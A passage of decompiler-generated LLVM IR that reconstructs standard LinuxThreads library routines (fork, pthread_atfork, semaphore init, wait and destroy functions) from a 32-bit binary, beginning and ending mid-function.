  store i32 %v0_804bd33, i32* @eax, align 4
  %v1_804bd38 = call i32 @__pthread_lock(i32 ptrtoint (i32* @0 to i32))
  %v0_804bd40 = load i32, i32* bitcast (i32** @global_var_806251c.162 to i32*), align 4
  %v1_804bd46 = inttoptr i32 %v0_804bd40 to i32*
  %v2_804bd46 = call i32 @__pthread_unlock(i32* %v1_804bd46)
  %v1_804bd50 = call i32 @__pthread_manager(i32 %arg1)
  ret i32 %v1_804bd50
}

define i32 @pthread_insert_list(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bd58 = load i32, i32* @ebx, align 4
  store i32 %v0_804bd58, i32* %stack_var_-4, align 4
  %v0_804bd59 = load i32, i32* @edx, align 4
  %v1_804bd59 = icmp eq i32 %v0_804bd59, 0
  %v0_804bd5b = load i32, i32* @eax, align 4
  store i32 %v0_804bd5b, i32* %ebx.global-to-local, align 4
  br i1 %v1_804bd59, label %dec_label_pc_804bd7a, label %dec_label_pc_804bd5f

dec_label_pc_804bd5f:                             ; preds = %entry
  %v4_804bd5f = icmp eq i32 %arg1, 0
  %v1_804bd64 = icmp eq i1 %v4_804bd5f, false
  br i1 %v1_804bd64, label %dec_label_pc_804bd6b.preheader, label %dec_label_pc_804bd71

dec_label_pc_804bd6b.preheader:                   ; preds = %dec_label_pc_804bd5f
  %v1_804bd6b2 = inttoptr i32 %v0_804bd5b to i32*
  %v2_804bd6b3 = load i32, i32* %v1_804bd6b2, align 4
  %v1_804bd6d4 = icmp eq i32 %v2_804bd6b3, 0
  %v1_804bd6f11 = icmp eq i1 %v1_804bd6d4, false
  br i1 %v1_804bd6f11, label %dec_label_pc_804bd68, label %dec_label_pc_804bd71

dec_label_pc_804bd68:                             ; preds = %dec_label_pc_804bd6b.preheader, %dec_label_pc_804bd68
  %v2_804bd6b12 = phi i32 [ %v2_804bd6b, %dec_label_pc_804bd68 ], [ %v2_804bd6b3, %dec_label_pc_804bd6b.preheader ]
  %v1_804bd68 = add i32 %v2_804bd6b12, 4
  store i32 %v1_804bd68, i32* %ebx.global-to-local, align 4
  %v1_804bd6b = inttoptr i32 %v1_804bd68 to i32*
  %v2_804bd6b = load i32, i32* %v1_804bd6b, align 4
  %v1_804bd6d = icmp eq i32 %v2_804bd6b, 0
  %v1_804bd6f = icmp eq i1 %v1_804bd6d, false
  br i1 %v1_804bd6f, label %dec_label_pc_804bd68, label %dec_label_pc_804bd6b.dec_label_pc_804bd71.loopexit_crit_edge

dec_label_pc_804bd6b.dec_label_pc_804bd71.loopexit_crit_edge: ; preds = %dec_label_pc_804bd68
  br label %dec_label_pc_804bd71

dec_label_pc_804bd71:                             ; preds = %dec_label_pc_804bd6b.preheader, %dec_label_pc_804bd6b.dec_label_pc_804bd71.loopexit_crit_edge, %dec_label_pc_804bd5f
  %v1_804bd71 = load i32, i32* @ecx, align 4
  %v2_804bd71 = inttoptr i32 %v1_804bd71 to i32*
  store i32 %v0_804bd59, i32* %v2_804bd71, align 4
  %v0_804bd73 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bd73 = inttoptr i32 %v0_804bd73 to i32*
  %v2_804bd73 = load i32, i32* %v1_804bd73, align 4
  %v1_804bd75 = load i32, i32* @ecx, align 4
  %v2_804bd75 = add i32 %v1_804bd75, 4
  %v3_804bd75 = inttoptr i32 %v2_804bd75 to i32*
  store i32 %v2_804bd73, i32* %v3_804bd75, align 4
  %v0_804bd78 = load i32, i32* @ecx, align 4
  %v1_804bd78 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bd78 = inttoptr i32 %v1_804bd78 to i32*
  store i32 %v0_804bd78, i32* %v2_804bd78, align 4
  %v2_804bd7a.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804bd7a

dec_label_pc_804bd7a:                             ; preds = %entry, %dec_label_pc_804bd71
  %v2_804bd7a = phi i32 [ %v0_804bd58, %entry ], [ %v2_804bd7a.pre, %dec_label_pc_804bd71 ]
  %.0 = phi i32 [ undef, %entry ], [ %v2_804bd73, %dec_label_pc_804bd71 ]
  store i32 %v2_804bd7a, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_804bd6b, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804bd7a, { 1, 0 }
  uselistorder label %dec_label_pc_804bd71, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bd68, { 1, 0 }
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp16, i32* %stack_var_-12, align 4
  %v0_804bd7d = load i32, i32* @eax, align 4
  store i32 %v0_804bd7d, i32* %ebx.global-to-local, align 4
  %v1_804bd892 = icmp eq i32 %v0_804bd7d, 0
  %v1_804bd8b9 = icmp eq i1 %v1_804bd892, false
  br i1 %v1_804bd8b9, label %dec_label_pc_804bd84.lr.ph, label %dec_label_pc_804bd8d

dec_label_pc_804bd84.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804bd84

dec_label_pc_804bd84:                             ; preds = %dec_label_pc_804bd84.lr.ph, %dec_label_pc_804bd84
  %v4_804bd84 = phi i32 [ %v0_804bd7d, %dec_label_pc_804bd84.lr.ph ], [ %v3_804bd86, %dec_label_pc_804bd84 ]
  %v5_804bd84 = inttoptr i32 %v4_804bd84 to i32*
  %v6_804bd84 = load i32, i32* %v5_804bd84, align 4
  call void @__pseudo_call(i32 %v6_804bd84)
  %v0_804bd86 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bd86 = add i32 %v0_804bd86, 4
  %v2_804bd86 = inttoptr i32 %v1_804bd86 to i32*
  %v3_804bd86 = load i32, i32* %v2_804bd86, align 4
  store i32 %v3_804bd86, i32* %ebx.global-to-local, align 4
  %v1_804bd89 = icmp eq i32 %v3_804bd86, 0
  %v1_804bd8b = icmp eq i1 %v1_804bd89, false
  br i1 %v1_804bd8b, label %dec_label_pc_804bd84, label %dec_label_pc_804bd89.dec_label_pc_804bd8d_crit_edge

dec_label_pc_804bd89.dec_label_pc_804bd8d_crit_edge: ; preds = %dec_label_pc_804bd84
  %v2_804bd8d.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804bd8d

dec_label_pc_804bd8d:                             ; preds = %dec_label_pc_804bd89.dec_label_pc_804bd8d_crit_edge, %entry
  %v2_804bd8d = phi i32 [ %v2_804bd8d.pre, %dec_label_pc_804bd89.dec_label_pc_804bd8d_crit_edge ], [ %tmp16, %entry ]
  ret i32 %v2_804bd8d

; uselistorder directives
  uselistorder i32 %v3_804bd86, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804bd84, { 1, 0 }
}

define i32 @fork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bd91 = load i32, i32* @ebp, align 4
  %v0_804bd92 = load i32, i32* @edi, align 4
  %v0_804bd93 = load i32, i32* @esi, align 4
  %v0_804bd94 = load i32, i32* @ebx, align 4
  store i32 %v0_804bd94, i32* %stack_var_-16, align 4
  %v1_804bd9d = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062eb0.163 to i32))
  %v0_804bda2 = load i32, i32* @global_var_8062ec8.164, align 8
  store i32 %v0_804bda2, i32* @eax, align 4
  %v0_804bda7 = load i32, i32* @global_var_8062ecc.165, align 4
  store i32 %v0_804bda7, i32* @ebp, align 4
  %v0_804bdad = load i32, i32* @global_var_8062ed0.166, align 16
  store i32 %v0_804bdad, i32* @ebx, align 4
  %v0_804bdb3 = call i32 @pthread_call_handlers()
  %v0_804bdb8 = call i32 @__pthread_once_fork_prepare()
  %v1_804bdc4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  %v0_804bdc9 = call i32 @__libc_fork()
  store i32 %v0_804bdc9, i32* @edi, align 4
  %v1_804bdd3 = icmp eq i32 %v0_804bdc9, 0
  %v1_804bdd5 = icmp eq i1 %v1_804bdd3, false
  br i1 %v1_804bdd5, label %dec_label_pc_804be56, label %dec_label_pc_804bdd7

dec_label_pc_804bdd7:                             ; preds = %entry
  %v2_804bde3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804bde3, i32* @ebx, align 4
  %v2_804bde8 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_804bdf2 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 1)
  %v3_804bdff = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8062910.167 to i32), i32* nonnull %stack_var_-20)
  %v1_804be07 = call i32 @pthread_mutexattr_destroy(i32 %v2_804bde3)
  %v2_804be17 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_804be21 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 0)
  store i32 0, i32* @esi, align 4
  %v3_804be2e = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8062eb0.163 to i32), i32* nonnull %stack_var_-20)
  %v1_804be36 = call i32 @pthread_mutexattr_destroy(i32 %v2_804bde3)
  %v0_804be3e = call i32 @__pthread_reset_main_thread()
  %v0_804be43 = call i32 @__fresetlockfiles()
  %v0_804be48 = call i32 @__pthread_once_fork_child()
  %v0_804be4d = load i32, i32* @ebp, align 4
  store i32 %v0_804be4d, i32* @eax, align 4
  %v0_804be4f = call i32 @pthread_call_handlers()
  br label %dec_label_pc_804be7e

dec_label_pc_804be56:                             ; preds = %entry
  %v1_804be5e = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  %v1_804be6a = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8062eb0.163 to i32))
  %v0_804be6f = call i32 @__pthread_once_fork_parent()
  %v0_804be74 = load i32, i32* @ebx, align 4
  store i32 %v0_804be74, i32* @eax, align 4
  %v0_804be76 = call i32 @pthread_call_handlers()
  br label %dec_label_pc_804be7e

dec_label_pc_804be7e:                             ; preds = %dec_label_pc_804bdd7, %dec_label_pc_804be56
  %v0_804be81 = load i32, i32* @edi, align 4
  %v2_804be83 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804be83, i32* @ebx, align 4
  store i32 %v0_804bd93, i32* @esi, align 4
  store i32 %v0_804bd92, i32* @edi, align 4
  store i32 %v0_804bd91, i32* @ebp, align 4
  ret i32 %v0_804be81

; uselistorder directives
  uselistorder i32 %v0_804bdc9, { 1, 0 }
  uselistorder i32 ()* @pthread_call_handlers, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804be7e, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v1_804be88 = call i32 @fork(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804be88
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_804be93 = call i32 @malloc(i32 24)
  store i32 %v1_804be93, i32* @ebx, align 4
  %v1_804bea2 = icmp eq i32 %v1_804be93, 0
  br i1 %v1_804bea2, label %dec_label_pc_804befa, label %dec_label_pc_804bea6

dec_label_pc_804bea6:                             ; preds = %entry
  %v1_804beae = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062eb0.163 to i32))
  store i32 %v1_804be93, i32* @ecx, align 4
  store i32 %arg1, i32* @edx, align 4
  store i32 ptrtoint (i32* @global_var_8062ec8.164 to i32), i32* @eax, align 4
  %v1_804bec0 = call i32 @pthread_insert_list(i32 0)
  store i32 %arg2, i32* @edx, align 4
  %v1_804becb = add i32 %v1_804be93, 8
  store i32 %v1_804becb, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8062ed0.166 to i32), i32* @eax, align 4
  %v1_804bed3 = call i32 @pthread_insert_list(i32 1)
  store i32 %arg3, i32* @edx, align 4
  %v1_804bede = add i32 %v1_804be93, 16
  store i32 %v1_804bede, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8062ecc.165 to i32), i32* @eax, align 4
  %v1_804bee6 = call i32 @pthread_insert_list(i32 1)
  %v1_804bef0 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8062eb0.163 to i32))
  br label %dec_label_pc_804befa

dec_label_pc_804befa:                             ; preds = %entry, %dec_label_pc_804bea6
  %v0_804befd = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_804bea6 ]
  ret i32 %v0_804befd

; uselistorder directives
  uselistorder i32 %v1_804be93, { 0, 2, 3, 1, 4 }
  uselistorder i32 (i32)* @pthread_insert_list, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804befa, { 1, 0 }
}

define i32 @enqueue() local_unnamed_addr {
entry:
  %v0_804bf01 = load i32, i32* @edx, align 4
  %v1_804bf01 = add i32 %v0_804bf01, 24
  %v2_804bf01 = inttoptr i32 %v1_804bf01 to i32*
  %v3_804bf01 = load i32, i32* %v2_804bf01, align 4
  store i32 %v3_804bf01, i32* @ebx, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bf1d = load i32, i32* @ebx, align 4
  store i32 %v0_804bf1d, i32* %stack_var_-4, align 4
  %v0_804bf1e = load i32, i32* @eax, align 4
  br label %dec_label_pc_804bf3c

dec_label_pc_804bf22:                             ; preds = %dec_label_pc_804bf3c
  %v1_804bf22 = load i32, i32* @edx, align 4
  %v12_804bf22 = icmp eq i32 %v2_804bf3c, %v1_804bf22
  %v1_804bf24 = icmp eq i1 %v12_804bf22, false
  %v1_804bf39 = add i32 %v2_804bf3c, 8
  br i1 %v1_804bf24, label %dec_label_pc_804bf3c, label %dec_label_pc_804bf26

dec_label_pc_804bf26:                             ; preds = %dec_label_pc_804bf22
  %v2_804bf26 = inttoptr i32 %v1_804bf39 to i32*
  %v3_804bf26 = load i32, i32* %v2_804bf26, align 4
  store i32 %v3_804bf26, i32* %v1_804bf3c, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_804bf26, align 4
  %v2_804bf44.pre = load i32, i32* %stack_var_-4, align 4
  %v0_804bf45.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf44

dec_label_pc_804bf3c:                             ; preds = %dec_label_pc_804bf22, %entry
  %v1_804bf29 = phi i32 [ %v0_804bf1e, %entry ], [ %v1_804bf39, %dec_label_pc_804bf22 ]
  %v1_804bf3c = inttoptr i32 %v1_804bf29 to i32*
  %v2_804bf3c = load i32, i32* %v1_804bf3c, align 4
  %v1_804bf3e = icmp eq i32 %v2_804bf3c, 0
  %v1_804bf40 = icmp eq i1 %v1_804bf3e, false
  br i1 %v1_804bf40, label %dec_label_pc_804bf22, label %dec_label_pc_804bf42

dec_label_pc_804bf42:                             ; preds = %dec_label_pc_804bf3c
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf44

dec_label_pc_804bf44:                             ; preds = %dec_label_pc_804bf26, %dec_label_pc_804bf42
  %v0_804bf45 = phi i32 [ %v0_804bf45.pre, %dec_label_pc_804bf26 ], [ 0, %dec_label_pc_804bf42 ]
  %v2_804bf44 = phi i32 [ %v2_804bf44.pre, %dec_label_pc_804bf26 ], [ %v0_804bf1d, %dec_label_pc_804bf42 ]
  store i32 %v2_804bf44, i32* @ebx, align 4
  ret i32 %v0_804bf45

; uselistorder directives
  uselistorder i32 %v2_804bf3c, { 2, 0, 1 }
  uselistorder i32* %v1_804bf3c, { 1, 0 }
  uselistorder i32 %v1_804bf39, { 1, 0 }
  uselistorder label %dec_label_pc_804bf44, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804bf4a = add i32 %arg1, 8
  %v2_804bf4a = inttoptr i32 %v1_804bf4a to i32*
  %v3_804bf4a = load i32, i32* %v2_804bf4a, align 4
  store i32 %v3_804bf4a, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804bf56 = load i32, i32* @esi, align 4
  %v0_804bf57 = load i32, i32* @ebx, align 4
  %v0_804bf5b = load i32, i32* @eax, align 4
  store i32 %v0_804bf5b, i32* @ebx, align 4
  %v0_804bf5d = load i32, i32* @edx, align 4
  store i32 %v0_804bf5d, i32* @esi, align 4
  %v1_804bf5f = icmp eq i32 %v0_804bf5d, 0
  br i1 %v1_804bf5f, label %dec_label_pc_804bf6b, label %dec_label_pc_804bf63

dec_label_pc_804bf63:                             ; preds = %entry
  %v1_804bf63 = add i32 %v0_804bf5b, 64
  %v2_804bf63 = inttoptr i32 %v1_804bf63 to i8*
  %v3_804bf63 = load i8, i8* %v2_804bf63, align 1
  %v4_804bf63 = icmp eq i8 %v3_804bf63, 0
  %v1_804bf67 = icmp eq i1 %v4_804bf63, false
  br i1 %v1_804bf67, label %dec_label_pc_804bf8d, label %dec_label_pc_804bf75

dec_label_pc_804bf6b:                             ; preds = %entry
  %v1_804bf6b = add i32 %v0_804bf5b, 28
  %v2_804bf6b = inttoptr i32 %v1_804bf6b to i32*
  %v3_804bf6b = load i32, i32* %v2_804bf6b, align 4
  store i32 %v3_804bf6b, i32* @eax, align 4
  store i32 %v0_804bf5b, i32* @edx, align 4
  %v1_804bf70 = call i32 @__pthread_lock(i32 %v0_804bf57)
  %v1_804bf75.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bf75

dec_label_pc_804bf75:                             ; preds = %dec_label_pc_804bf63, %dec_label_pc_804bf6b
  %v1_804bf75 = phi i32 [ %v0_804bf5b, %dec_label_pc_804bf63 ], [ %v1_804bf75.pre, %dec_label_pc_804bf6b ]
  %v2_804bf75 = add i32 %v1_804bf75, 444
  %v3_804bf75 = inttoptr i32 %v2_804bf75 to i32*
  store i32 %v0_804bf5d, i32* %v3_804bf75, align 4
  %v1_804bf7d = icmp eq i1 %v1_804bf5f, false
  br i1 %v1_804bf7d, label %dec_label_pc_804bf8d, label %dec_label_pc_804bf7f

dec_label_pc_804bf7f:                             ; preds = %dec_label_pc_804bf75
  %v0_804bf82 = load i32, i32* @ebx, align 4
  %v1_804bf82 = add i32 %v0_804bf82, 28
  %v2_804bf82 = inttoptr i32 %v1_804bf82 to i32*
  %v3_804bf82 = load i32, i32* %v2_804bf82, align 4
  %v1_804bf85 = inttoptr i32 %v3_804bf82 to i32*
  %v2_804bf85 = call i32 @__pthread_unlock(i32* %v1_804bf85)
  br label %dec_label_pc_804bf8d

dec_label_pc_804bf8d:                             ; preds = %dec_label_pc_804bf75, %dec_label_pc_804bf63, %dec_label_pc_804bf7f
  %v2_804bf8d = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804bf57, i32* @ebx, align 4
  store i32 %v0_804bf56, i32* @esi, align 4
  ret i32 %v2_804bf8d

; uselistorder directives
  uselistorder i1 %v1_804bf5f, { 1, 0 }
  uselistorder label %dec_label_pc_804bf8d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bf75, { 1, 0 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v1_804bf94 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804bf99 = inttoptr i32 %v1_804bf94 to i32*
  store i32 38, i32* %v1_804bf99, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v1_804bfa9 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804bfae = inttoptr i32 %v1_804bfa9 to i32*
  store i32 38, i32* %v1_804bfae, align 4
  ret i32 -1
}

define i32 @sem_open() local_unnamed_addr {
entry:
  %v1_804bfbe = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804bfc3 = inttoptr i32 %v1_804bfbe to i32*
  store i32 38, i32* %v1_804bfc3, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804bfd8 = add i32 %arg1, 12
  %v2_804bfd8 = inttoptr i32 %v1_804bfd8 to i32*
  %v3_804bfd8 = load i32, i32* %v2_804bfd8, align 4
  %v4_804bfd8 = icmp eq i32 %v3_804bfd8, 0
  br i1 %v4_804bfd8, label %dec_label_pc_804bfec, label %dec_label_pc_804bfde

dec_label_pc_804bfde:                             ; preds = %entry
  %v1_804bfde = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804bfe6 = inttoptr i32 %v1_804bfde to i32*
  store i32 16, i32* %v1_804bfe6, align 4
  %v0_804bfec.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bfec

dec_label_pc_804bfec:                             ; preds = %entry, %dec_label_pc_804bfde
  %v0_804bfec = phi i32 [ 0, %entry ], [ %v0_804bfec.pre, %dec_label_pc_804bfde ]
  ret i32 %v0_804bfec

; uselistorder directives
  uselistorder label %dec_label_pc_804bfec, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804bff3 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804bfff = call i32 @__pthread_lock(i32 %v0_804bff3)
  %v0_804c004 = load i32, i32* @ebx, align 4
  %v1_804c004 = add i32 %v0_804c004, 8
  %v2_804c004 = inttoptr i32 %v1_804c004 to i32*
  %v3_804c004 = load i32, i32* %v2_804c004, align 4
  %v1_804c007 = icmp eq i32 %v3_804c004, 0
  %v1_804c009 = icmp eq i1 %v1_804c007, false
  br i1 %v1_804c009, label %dec_label_pc_804c01b, label %dec_label_pc_804c00b

dec_label_pc_804c00b:                             ; preds = %entry
  %v1_804c00b = call i32 @__errno_location(i32 %v0_804bff3)
  store i32 -1, i32* @esi, align 4
  %v1_804c013 = inttoptr i32 %v1_804c00b to i32*
  store i32 11, i32* %v1_804c013, align 4
  br label %dec_label_pc_804c021

dec_label_pc_804c01b:                             ; preds = %entry
  %v1_804c01b = add i32 %v3_804c004, -1
  store i32 0, i32* @esi, align 4
  store i32 %v1_804c01b, i32* %v2_804c004, align 4
  br label %dec_label_pc_804c021

dec_label_pc_804c021:                             ; preds = %dec_label_pc_804c00b, %dec_label_pc_804c01b
  %v0_804c024 = load i32, i32* @ebx, align 4
  %v1_804c025 = inttoptr i32 %v0_804c024 to i32*
  %v2_804c025 = call i32 @__pthread_unlock(i32* %v1_804c025)
  %v0_804c02a = load i32, i32* @esi, align 4
  ret i32 %v0_804c02a

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c021, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  store i32 %tmp4, i32* %eax.global-to-local, align 4
  %v2_804c03d = icmp slt i32 %arg3, 0
  %v1_804c03f = icmp eq i1 %v2_804c03d, false
  br i1 %v1_804c03f, label %dec_label_pc_804c04e, label %dec_label_pc_804c041

dec_label_pc_804c041:                             ; preds = %entry
  %v1_804c041 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804c041, i32* %eax.global-to-local, align 4
  %v1_804c046 = inttoptr i32 %v1_804c041 to i32*
  store i32 22, i32* %v1_804c046, align 4
  br label %dec_label_pc_804c07e

dec_label_pc_804c04e:                             ; preds = %entry
  %v4_804c04e = icmp eq i32 %arg2, 0
  br i1 %v4_804c04e, label %dec_label_pc_804c065, label %dec_label_pc_804c055

dec_label_pc_804c055:                             ; preds = %dec_label_pc_804c04e
  %v1_804c055 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804c055, i32* %eax.global-to-local, align 4
  %v1_804c05a = inttoptr i32 %v1_804c055 to i32*
  store i32 38, i32* %v1_804c05a, align 4
  br label %dec_label_pc_804c07e

dec_label_pc_804c065:                             ; preds = %dec_label_pc_804c04e
  store i32 0, i32* %arg1, align 4
  %v0_804c06b = load i32, i32* %eax.global-to-local, align 4
  %v1_804c06b = add i32 %v0_804c06b, 4
  %v2_804c06b = inttoptr i32 %v1_804c06b to i32*
  store i32 0, i32* %v2_804c06b, align 4
  %v1_804c072 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c072 = add i32 %v1_804c072, 8
  %v3_804c072 = inttoptr i32 %v2_804c072 to i32*
  store i32 %arg3, i32* %v3_804c072, align 4
  %v0_804c075 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c075 = add i32 %v0_804c075, 12
  %v2_804c075 = inttoptr i32 %v1_804c075 to i32*
  store i32 0, i32* %v2_804c075, align 4
  br label %dec_label_pc_804c07e

dec_label_pc_804c07e:                             ; preds = %dec_label_pc_804c055, %dec_label_pc_804c041, %dec_label_pc_804c065
  %storemerge = phi i32 [ 0, %dec_label_pc_804c065 ], [ -1, %dec_label_pc_804c041 ], [ -1, %dec_label_pc_804c055 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804c07e, { 2, 0, 1 }
}

define i32 @thread_self.1(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804c089 = load i32, i32* @esp, align 4
  %v1_804c089 = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804c089 = icmp ult i32 %v0_804c089, %v1_804c089
  %v1_804c08f = icmp eq i1 %v7_804c089, false
  br i1 %v1_804c08f, label %dec_label_pc_804c0c0, label %dec_label_pc_804c091

dec_label_pc_804c091:                             ; preds = %entry
  %v1_804c091 = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804c091 = icmp ult i32 %v0_804c089, %v1_804c091
  br i1 %v7_804c091, label %dec_label_pc_804c0a6, label %dec_label_pc_804c099

dec_label_pc_804c099:                             ; preds = %dec_label_pc_804c091
  %v1_804c09e = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804c09e = icmp ult i32 %v0_804c089, %v1_804c09e
  br i1 %v7_804c09e, label %dec_label_pc_804c0c0, label %dec_label_pc_804c0a6

dec_label_pc_804c0a6:                             ; preds = %dec_label_pc_804c099, %dec_label_pc_804c091
  %v0_804c0a6 = load i32, i32* @global_var_8067650.138, align 16
  %v1_804c0a6 = icmp eq i32 %v0_804c0a6, 0
  br i1 %v1_804c0a6, label %dec_label_pc_804c0b4, label %dec_label_pc_804c0af

dec_label_pc_804c0af:                             ; preds = %dec_label_pc_804c0a6
  %v0_804c0af = call i32 @__pthread_find_self()
  br label %dec_label_pc_804c0b4

dec_label_pc_804c0b4:                             ; preds = %dec_label_pc_804c0a6, %dec_label_pc_804c0af
  %v2_804c0ba = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804c0c0

dec_label_pc_804c0c0:                             ; preds = %dec_label_pc_804c099, %entry, %dec_label_pc_804c0b4
  %v0_804c0c0 = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804c099 ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v2_804c0ba, %dec_label_pc_804c0b4 ]
  ret i32 %v0_804c0c0

; uselistorder directives
  uselistorder label %dec_label_pc_804c0c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c0b4, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c0c1 = load i32, i32* @esi, align 4
  %v0_804c0c2 = load i32, i32* @ebx, align 4
  %v2_804c0c6 = call i32 @thread_self.1(i32 %v0_804c0c2, i32 %v0_804c0c1)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_804c0c6, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804c0d9 = call i32 @__pthread_lock(i32 %v2_804c0c6)
  store i32 %arg2, i32* @edx, align 4
  %v0_804c0e2 = load i32, i32* @ebx, align 4
  %v1_804c0e2 = add i32 %v0_804c0e2, 12
  store i32 %v1_804c0e2, i32* @eax, align 4
  %v0_804c0e5 = call i32 @remove_from_queue()
  store i32 %v0_804c0e5, i32* @esi, align 4
  %v0_804c0ef = load i32, i32* @ebx, align 4
  %v1_804c0f0 = inttoptr i32 %v0_804c0ef to i32*
  %v2_804c0f0 = call i32 @__pthread_unlock(i32* %v1_804c0f0)
  %v0_804c0f5 = load i32, i32* @esi, align 4
  ret i32 %v0_804c0f5

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend() local_unnamed_addr {
entry:
  %v0_804c100 = load i32, i32* @eax, align 4
  %v1_804c101 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804c100)
  ret i32 %v1_804c101
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_804c10c = load i32, i32* @esi, align 4
